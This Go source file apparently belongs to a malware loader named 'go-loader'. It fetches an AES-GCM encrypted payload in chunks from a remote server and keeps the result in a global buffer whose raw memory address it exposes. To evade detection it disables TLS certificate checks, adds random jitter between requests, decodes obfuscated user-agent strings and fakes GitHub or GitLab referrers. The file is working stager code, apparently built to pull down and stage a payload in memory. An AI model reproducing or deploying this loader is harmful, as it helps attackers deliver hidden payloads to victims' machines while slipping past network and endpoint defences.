package net

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"go-loader/pkg/obf"
)

const (
	NonceLength = 12
)

var globalBuffer []byte

type FileMetadata struct {
	FileID     string `json:"file_id"`
	Key        string `json:"key"`         
	ChunkCount int    `json:"chunk_count"`
	ChunkSize  int    `json:"chunk_size"`
	TotalSize  int    `json:"total_size"`
}

type ChunkData struct {
	Chunk       string `json:"chunk"`       
	ChunkNumber int    `json:"chunk_number"`
	TotalChunks int    `json:"total_chunks"`
	FileID      string `json:"file_id"`
}

type FileInfo struct {
	FileID     string `json:"file_id"`
	Key        string `json:"key"`         
	ChunkCount int    `json:"chunk_count"`
	ChunkSize  int    `json:"chunk_size"`
	TotalSize  int    `json:"total_size"`
}

func GetGlobalBufferRegion() (uintptr, uint32, error) {
	if globalBuffer == nil || len(globalBuffer) == 0 {
		return 0, 0, fmt.Errorf("global buffer is empty or not initialized")
	}
	
	bufferAddr := uintptr(unsafe.Pointer(&globalBuffer[0]))
	bufferSize := uint32(len(globalBuffer))
	
	return bufferAddr, bufferSize, nil
}

func FindBufferRegion(buffer []byte) (uintptr, uint32, error) {
	if buffer == nil || len(buffer) == 0 {
		return 0, 0, fmt.Errorf("buffer is empty or nil")
	}
	
	bufferAddr := uintptr(unsafe.Pointer(&buffer[0]))
	bufferSize := uint32(len(buffer))
	
	return bufferAddr, bufferSize, nil
}

func randomJitter(baseMs int, maxJitterMs int) {
	delay := time.Duration(baseMs+rand.Intn(maxJitterMs)) * time.Millisecond
	time.Sleep(delay)
}

func decryptChunk(encryptedChunk []byte, key []byte) ([]byte, error) {
	if len(encryptedChunk) <= NonceLength {
		return nil, fmt.Errorf("encrypted chunk too short")
	}

	nonce := encryptedChunk[:NonceLength]
	ciphertext := encryptedChunk[NonceLength:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt: %v", err)
	}

	return plaintext, nil
}

func createSecureClient() *http.Client {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, 
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		PreferServerCipherSuites: true,
	}
	
	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		DisableKeepAlives:   true,
		DisableCompression:  false,
		MaxIdleConns:        10,
		IdleConnTimeout:     60 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
		ForceAttemptHTTP2:   true,
	}
	
	client := &http.Client{
		Transport: transport,
		Timeout:   60 * time.Second,
	}
	
	return client
}

func setCommonHeaders(req *http.Request, targetHost string) {
	ua := GetUA()
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "close")
	
	if targetHost != "" {
		if strings.Contains(targetHost, "github") {
			req.Header.Set("Referer", "https://github.com/")
		} else if strings.Contains(targetHost, "gitlab") {
			req.Header.Set("Referer", "https://gitlab.com/")
		} else {
			req.Header.Set("Referer", fmt.Sprintf("https://%s/", targetHost))
		}
	}
}

func getFileInfo(targetURL string) (*FileInfo, error) {
	randomJitter(100, 300)
	
	client := createSecureClient()
	
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}
	
	parsedURL, _ := url.Parse(targetURL)
	setCommonHeaders(req, parsedURL.Host)
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to download file info: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned error: %s", resp.Status)
	}
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}
	
	var fileInfo FileInfo
	if err := json.Unmarshal(body, &fileInfo); err != nil {
		var metadata FileMetadata
		if jsonErr := json.Unmarshal(body, &metadata); jsonErr == nil {
			fileInfo = FileInfo{
				FileID:     metadata.FileID,
				Key:        metadata.Key,
				ChunkCount: metadata.ChunkCount,
				ChunkSize:  metadata.ChunkSize,
				TotalSize:  metadata.TotalSize,
			}
			return &fileInfo, nil
		}
		return nil, fmt.Errorf("failed to parse file info: %v", err)
	}
	
	return &fileInfo, nil
}

func downloadChunk(serverBase, fileID string, chunkNum int) ([]byte, error) {
	randomJitter(50, 150)
	
	client := createSecureClient()
	
	requestURL := fmt.Sprintf("%s/chunk?id=%s&chunk=%d", serverBase, url.QueryEscape(fileID), chunkNum)
	req, err := http.NewRequest("GET", requestURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}
	
	parsedURL, _ := url.Parse(requestURL)
	setCommonHeaders(req, parsedURL.Host)
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to download chunk: %v", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned error: %s", resp.Status)
	}
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}
	
	var chunkData ChunkData
	if err := json.Unmarshal(body, &chunkData); err != nil {
		return nil, fmt.Errorf("failed to parse chunk data: %v", err)
	}

	decodedChunk, err := base64.StdEncoding.DecodeString(chunkData.Chunk)
	if err != nil {
		return nil, fmt.Errorf("failed to decode chunk data: %v", err)
	}
	
	return decodedChunk, nil
}

func DownloadFile(targetURL string) ([]byte, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse URL: %v", err)
	}
	
	if parsedURL.Scheme == "" || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") {
		return nil, fmt.Errorf("URL must begin with http:// or https://")
	}
	
	fileInfo, err := getFileInfo(targetURL)
	if err != nil {
		return nil, fmt.Errorf("failed to get file info: %v", err)
	}
	
	key, err := base64.StdEncoding.DecodeString(fileInfo.Key)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %v", err)
	}
	
	serverBase := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	
	result := make([]byte, 0, fileInfo.TotalSize)
	
	for chunkNum := 0; chunkNum < fileInfo.ChunkCount; chunkNum++ {
		encryptedChunk, err := downloadChunk(serverBase, fileInfo.FileID, chunkNum)
		if err != nil {
			return nil, fmt.Errorf("failed to download chunk %d: %v", chunkNum, err)
		}
		
		plainChunk, err := decryptChunk(encryptedChunk, key)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt chunk %d: %v", chunkNum, err)
		}
		
		result = append(result, plainChunk...)
		
		randomJitter(30, 100)
	}
	
	globalBuffer = make([]byte, len(result))
	copy(globalBuffer, result)
	
	ptr := unsafe.Pointer(&globalBuffer[0])
	runtime.KeepAlive(ptr)
	runtime.KeepAlive(globalBuffer)
	
	return result, nil
}

func randomIndex(length int) int {
	return rand.Intn(length)
}

func GetUA() string {
	values := []uint32{
		1952754633, 2905136297, 4130953010, 4130951921, 2515949141,
		222516017, 2693133715, 3709930420, 3153036755, 4203786264,
		1434070913, 423778214, 350507105, 1703267631, 3830667078,
		1914621356, 2417304603, 543457218, 4271095422, 3184214496,
		2052393191, 4208372894, 3634488812, 3991748456, 1095669213,
		1142401931, 1146977454, 1770329412, 1030629383, 1934717116,
		1330649263, 1210002353, 1524148092, 681145231, 1609284707,
		1760052334, 3862912451, 1794335975, 1918804120, 2964903769,
		307468793, 2124166808, 1970919641, 1595158123, 422147776,
		3866893171, 267248916, 892945811, 1548893238, 2054794018,
		368480778, 205656825, 247455888, 710845588, 3852485815,
		2649214766, 3705530546, 2728434626, 4277221896,
	}

	randIdx := randomIndex(len(values))
	return obf.Decode(values[randIdx])
}